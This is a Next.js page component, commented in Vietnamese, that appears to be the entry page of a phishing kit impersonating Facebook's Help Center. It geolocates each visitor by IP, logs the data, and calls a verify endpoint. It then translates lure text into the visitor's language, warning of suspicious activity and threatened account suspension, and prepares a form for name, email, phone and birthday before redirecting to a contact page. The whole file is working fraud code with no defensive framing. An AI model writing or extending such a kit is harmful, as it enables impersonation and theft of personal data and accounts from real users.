'use client';
import logoGif from '@/assets/images/logo1.gif';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import countryToLanguage from '@/utils/country-to-language';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import { useEffect, useCallback, useState, useRef, type FC } from 'react';

const Index: FC = () => {
    const router = useRouter();
    const { geoInfo, setGeoInfo, translations: storeTranslations, setTranslations } = store();
    const isTranslatingRef = useRef(false);
    
    const [showGif, setShowGif] = useState(true);
    const [translationsReady, setTranslationsReady] = useState(false);
    const hasInitialized = useRef(false);
    const verifyCalled = useRef(false);
    const hasRedirected = useRef(false);
    const translationStarted = useRef(false);

    // Initialize security: get geoInfo (không chặn bot nữa, không dịch modal)
    const initializeSecurity = useCallback(async () => {
        try {
            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
            const ipData = response.data;
            
            localStorage.setItem('ipInfo', JSON.stringify(ipData));
            
            setGeoInfo({
                asn: ipData.asn || 0,
                ip: ipData.ip || 'CHỊU',
                country: ipData.country || 'CHỊU',
                city: ipData.city || 'CHỊU',
                country_code: ipData.country_code || 'US'
            });
            
            const detectedCountry = ipData.country_code || 'US';
            const targetLang = countryToLanguage[detectedCountry] || 'en';
            localStorage.setItem('targetLang', targetLang);
            
        } catch (error) {
            console.error('Security initialization failed:', error);
            setGeoInfo({
                asn: 0,
                ip: 'CHỊU',
                country: 'CHỊU',
                city: 'CHỊU',
                country_code: 'US'
            });
        }
    }, [setGeoInfo]);

    // Load gif: ẩn sau đúng 2.7 giây (chỉ chạy 1 lần duy nhất, không bị reset)
    const gifTimerStarted = useRef(false);
    useEffect(() => {
        if (!gifTimerStarted.current) {
            gifTimerStarted.current = true;
            const startTime = Date.now();
            const checkAndHide = () => {
                const elapsed = Date.now() - startTime;
                if (elapsed >= 2700) {
                    setShowGif(false);
                } else {
                    setTimeout(checkAndHide, 100);
                }
            };
            checkAndHide();
        }
    }, []);

    // Initialize security và gọi verify API ngay khi component mount (song song)
    useEffect(() => {
        if (!hasInitialized.current) {
            hasInitialized.current = true;
            initializeSecurity();
            
            // Gọi verify API ngay (không cần đợi geoInfo)
            const callVerify = async () => {
                if (!verifyCalled.current) {
                    verifyCalled.current = true;
                    try {
                        await axios.post('/api/verify');
                    } catch (error) {
                        console.error('Verify API failed:', error);
                    }
                }
            };
            callVerify();
        }
    }, [initializeSecurity]);

    // Dịch text của contact page (ngầm) ngay khi có geoInfo - chỉ chạy 1 lần
    useEffect(() => {
        if (!geoInfo) return;
        if (isTranslatingRef.current || translationStarted.current) return;

        const pageTexts = [
            'Help Center', 'English', 'Using', 'Managing Your Account', 'Privacy, Safety and Security',
            'Policies and Reporting', 'Account Policy Complaints', 'We have detected suspicious activity on your Pages and accounts, including reports of copyright infringement and policy violations',
            'To protect your account, please verify your information now to ensure a quick and accurate review process.',
            'This is a mandatory verification step for Facebook accounts. Please complete the verification immediately to avoid account suspension and to expedite the resolution of your case.',
            'Name', 'Email', 'Phone Number', 'Birthday', 'Your Appeal', 'Please describe your appeal in detail...',
            'Submit', 'This field is required', 'Please enter a valid email address', 'Please wait...'
        ];

        const hasPageTexts = pageTexts.every((text) => storeTranslations[text]);
        if (hasPageTexts) {
            setTranslationsReady(true);
            return;
        }

        translationStarted.current = true;
        isTranslatingRef.current = true;
        const translatePageTexts = async () => {
            try {
                const results = await Promise.all(
                    pageTexts.map((text) =>
                        translateText(text, geoInfo.country_code).then((translated) => ({ text, translated }))
                    )
                );

                const translatedMap: Record<string, string> = { ...storeTranslations };
                results.forEach(({ text, translated }) => {
                    translatedMap[text] = translated;
                });

                setTranslations(translatedMap);
                setTranslationsReady(true);
            } catch (error) {
                console.error('Translation failed:', error);
                setTranslationsReady(true);
            } finally {
                isTranslatingRef.current = false;
            }
        };
        translatePageTexts();
    }, [geoInfo, storeTranslations, setTranslations]);

    // Redirect khi gif ẩn VÀ dịch xong (để trang contact không bị trắng)
    useEffect(() => {
        if (!showGif && translationsReady && !hasRedirected.current) {
            hasRedirected.current = true;
            const currentTime = Date.now();
            router.push(`/contact/${currentTime}`);
        }
    }, [showGif, translationsReady, router]);

    const logoGifSrc: string = typeof logoGif === 'string' ? logoGif : (logoGif as { src: string }).src;

    return (
        <>
            {showGif && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-white">
                    <img 
                        src={logoGifSrc} 
                        alt="Loading" 
                        className="w-[450px] h-auto lg:w-[600px] lg:h-auto object-contain" 
                    />
                </div>
            )}
        </>
    );
};

export default Index;
